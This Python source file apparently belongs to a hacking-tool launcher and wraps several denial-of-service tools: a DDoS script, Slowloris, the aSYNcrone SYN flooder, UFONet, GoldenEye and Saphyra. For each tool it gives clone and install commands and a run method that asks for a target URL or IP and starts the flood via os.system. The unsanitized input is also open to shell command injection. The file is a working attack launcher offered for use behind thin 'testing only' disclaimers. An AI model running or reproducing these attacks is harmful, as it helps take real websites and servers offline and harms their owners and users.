# coding=utf-8
import os
import subprocess

from core import HackingTool
from core import HackingToolsCollection


class ddos(HackingTool):
    TITLE = "ddos"
    DESCRIPTION = (
        "Best DDoS Attack Script With 36 Plus Methods."
        "DDoS attacks\n\b "
        "for SECURITY TESTING PURPOSES ONLY! "
    )

    INSTALL_COMMANDS = [
        "sudo apt-get install -y python3-venv",
        "git clone https://github.com/the-deepnet/ddos.git",
        "cd ddos && python3 -m venv ddos-env",
        "cd ddos && . ddos-env/bin/activate && pip install -r requirements.txt"
    ]
    PROJECT_URL = "https://github.com/the-deepnet/ddos.git"

    def run(self):
        method = input("Enter Method >> ")
        url = input("Enter URL >> ")
        threads = input("Enter Threads >> ")
        proxylist = input(" Enter ProxyList >> ")
        multiple = input(" Enter Multiple >> ")
        timer = input(" Enter Timer >> ")
        os.system(f"cd ddos && . ddos-env/bin/activate && python3 ddos {method} {url} socks_type5.4.1 {threads} {proxylist} {multiple} {timer}")


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    DESCRIPTION = (
        "Slowloris is basically an HTTP Denial of Service attack."
        "It sends lots of HTTP Request headers without completing the requests,"
        "keeping the connections open and eventually overwhelming the server."
    )
    INSTALL_COMMANDS = [
        "sudo apt-get install -y python3-venv",
        "mkdir -p slowloris-tool",
        "cd slowloris-tool && python3 -m venv slowloris-env",
        "cd slowloris-tool && . slowloris-env/bin/activate && pip install slowloris"
    ]
    PROJECT_URL = "https://github.com/gkbrk/slowloris"

    def run(self):
        target_site = input("Enter Target Site:- ")
        num_sockets = input("Enter Number of Sockets (default 150):- ") or "150"
        
        # Create a simple wrapper script to run slowloris
        wrapper_script = """#!/usr/bin/env python3
from slowloris import slowloris
import sys

if __name__ == "__main__":
    args = sys.argv[1:]
    slowloris.slowloris(*args)
"""
        
        try:
            # Create the wrapper script
            with open("slowloris-tool/run_slowloris.py", "w") as f:
                f.write(wrapper_script)
            
            print(f"Starting Slowloris attack on {target_site} with {num_sockets} sockets...")
            os.system(f"cd slowloris-tool && . slowloris-env/bin/activate && python run_slowloris.py {target_site} -s {num_sockets}")
        except Exception as e:
            print(f"Error running slowloris: {str(e)}")
            print("\nAlternative method to run slowloris:")
            print("1. cd slowloris-tool")
            print("2. . slowloris-env/bin/activate")
            print(f"3. python -c 'from slowloris import slowloris; slowloris.slowloris(\"{target_site}\", socket_count={num_sockets})'")


class Asyncrone(HackingTool):
    TITLE = "Asyncrone | Multifunction SYN Flood DDoS Weapon"
    DESCRIPTION = (
        "aSYNcrone is a C language based, mulltifunction SYN Flood "
        "DDoS Weapon.\nDisable the destination system by sending a "
        "SYN packet intensively to the destination."
    )
    INSTALL_COMMANDS = [
        "if [ ! -d 'aSYNcrone' ]; then git clone https://github.com/fatih4842/aSYNcrone.git; else echo 'aSYNcrone directory already exists, using existing installation'; fi",
        "cd aSYNcrone && sudo gcc -o aSYNcrone aSYNcrone.c -lpthread || echo 'Compilation failed, trying alternative method...' && cd aSYNcrone && sudo gcc -o aSYNcrone aSYNcrone.c -pthread"
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        # Check if the compiled binary exists
        if not os.path.exists("aSYNcrone/aSYNcrone"):
            print("aSYNcrone binary not found. Trying to compile again...")
            os.system("cd aSYNcrone && sudo gcc -o aSYNcrone aSYNcrone.c -lpthread || sudo gcc -o aSYNcrone aSYNcrone.c -pthread")
            if not os.path.exists("aSYNcrone/aSYNcrone"):
                print("Failed to compile aSYNcrone. Please check if you have gcc installed.")
                return
        
        source_port = input("Enter Source Port >> ")
        target_ip = input("Enter Target IP >> ")
        target_port = input("Enter Target port >> ")
        
        # Validate inputs
        try:
            source_port = int(source_port)
            target_port = int(target_port)
            if source_port < 1 or source_port > 65535 or target_port < 1 or target_port > 65535:
                print("Port numbers must be between 1 and 65535")
                return
        except ValueError:
            print("Port numbers must be integers")
            return
            
        print(f"Running aSYNcrone attack on {target_ip}:{target_port} from source port {source_port}...")
        os.system(f"cd aSYNcrone && sudo ./aSYNcrone {source_port} {target_ip} {target_port} 1000")


class UFONet(HackingTool):
    TITLE = "UFONet"
    DESCRIPTION = (
        "UFONet - is a free software, P2P and cryptographic "
        "-disruptive \n toolkit- that allows to perform DoS and "
        "DDoS attacks\n\b "
        "More Usage Visit"
    )
    INSTALL_COMMANDS = [
        "sudo apt-get install -y python3-venv python3-dev",
        "if [ ! -d 'ufonet' ]; then sudo git clone https://github.com/epsylon/ufonet.git; else echo 'UFONet directory already exists'; fi",
        "cd ufonet && python3 -m venv ufonet-env",
        "cd ufonet && . ufonet-env/bin/activate && pip install --upgrade pip",
        "cd ufonet && . ufonet-env/bin/activate && pip install pycurl GeoIP python-geoip requests pycryptodomex whois scapy duckduckgo-search",
        "sudo apt-get install -y python3-geoip python3-whois python3-scapy"
    ]
    PROJECT_URL = "https://github.com/epsylon/ufonet"

    def run(self):
        print("\nRunning UFONet with Python 3.11+ compatibility patch...")
        
        # First, apply the patch if needed
        current_dir = os.path.dirname(os.path.abspath(__file__))
        patch_script = os.path.join(current_dir, "ufonet_patch.py")
        
        if os.path.exists(patch_script):
            print("Applying compatibility patch for Python 3.11+...")
            os.system(f"python3 {patch_script}")
        else:
            print(f"Warning: Patch script not found at {patch_script}")
            print("You may need to manually fix the cgi module issue.")
        
        try:
            print("\nStarting UFONet. If you encounter errors, try these alternative commands:")
            print("1. cd ufonet && . ufonet-env/bin/activate && python3 ufonet --gui")
            print("2. cd ufonet && . ufonet-env/bin/activate && python3 ufonet --attack\n")
            
            os.system("cd ufonet && . ufonet-env/bin/activate && python3 ufonet --gui")
        except Exception as e:
            print(f"Error running UFONet: {str(e)}")
            print("\nTry running UFONet manually:")
            print("cd ufonet && . ufonet-env/bin/activate && python3 ufonet --attack")


class GoldenEye(HackingTool):
    TITLE = "GoldenEye"
    DESCRIPTION = (
        "GoldenEye is a python3 app for SECURITY TESTING PURPOSES ONLY!\n"
        "GoldenEye is a HTTP DoS Test Tool."
    )
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/jseidl/GoldenEye.git",
        "chmod -R 755 GoldenEye"
    ]
    PROJECT_URL = "https://github.com/jseidl/GoldenEye"

    def run(self):
        os.system("cd GoldenEye && sudo python3 goldeneye.py")
        print("\033[96m Go to Directory \n [*] USAGE: ./goldeneye.py <url> [OPTIONS]")


class Saphyra(HackingTool):
    TITLE = "SaphyraDDoS"
    DESCRIPTION = "A complex python code to DDoS any website with a very easy usage.!\n"
    INSTALL_COMMANDS = [
        "sudo apt-get install -y python3-venv",
        "git clone https://github.com/anonymous24x7/Saphyra-DDoS.git",
        "cd Saphyra-DDoS && python3 -m venv saphyra-env",
        "cd Saphyra-DDoS && chmod +x saphyra.py"
    ]
    PROJECT_URL = "https://github.com/anonymous24x7/Saphyra-DDoS"

    def run(self):
        # First, apply the indentation patch
        current_dir = os.path.dirname(os.path.abspath(__file__))
        patch_script = os.path.join(current_dir, "saphyra_patch.py")
        
        if os.path.exists(patch_script):
            print("Applying indentation patch to fix TabError...")
            os.system(f"python3 {patch_script}")
        else:
            print(f"Warning: Patch script not found at {patch_script}")
            print("You may encounter indentation errors when running the tool.")
        
        url = input("Enter url>>> ")
        try:
            os.system(f"cd Saphyra-DDoS && . saphyra-env/bin/activate && python saphyra.py {url}")
        except Exception as e:
            print(f"Error running Saphyra: {str(e)}")
            print("If you're seeing TabError, try manually fixing the indentation in saphyra.py")


class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [SlowLoris(), Asyncrone(), UFONet(), GoldenEye(), Saphyra()]
